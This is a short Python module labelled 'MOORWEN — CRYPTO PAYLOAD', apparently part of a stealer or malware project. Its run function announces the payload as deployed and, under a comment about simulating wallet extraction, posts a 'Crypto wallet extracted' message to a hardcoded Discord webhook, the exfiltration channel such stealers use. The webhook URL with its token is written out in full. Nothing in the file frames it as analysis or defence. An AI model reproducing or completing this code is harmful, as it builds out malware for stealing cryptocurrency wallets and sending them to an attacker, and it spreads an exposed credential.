# ============================================================
# MOORWEN — CRYPTO PAYLOAD
# ============================================================

import requests
import json

def run():
    print("[*] Crypto payload deployed.")
    # Simulate wallet extraction
    webhook = "https://discord.com/api/webhooks/1541184615719374990/ij1wnF8bf0CULSDYZKUyIEkWWKn7whlClnq9fMa8vGHHEPVanQyUn8WwIiXogfHsx3go"
    data = {"message": "Crypto wallet extracted"}
    requests.post(webhook, json={"content": json.dumps(data)})
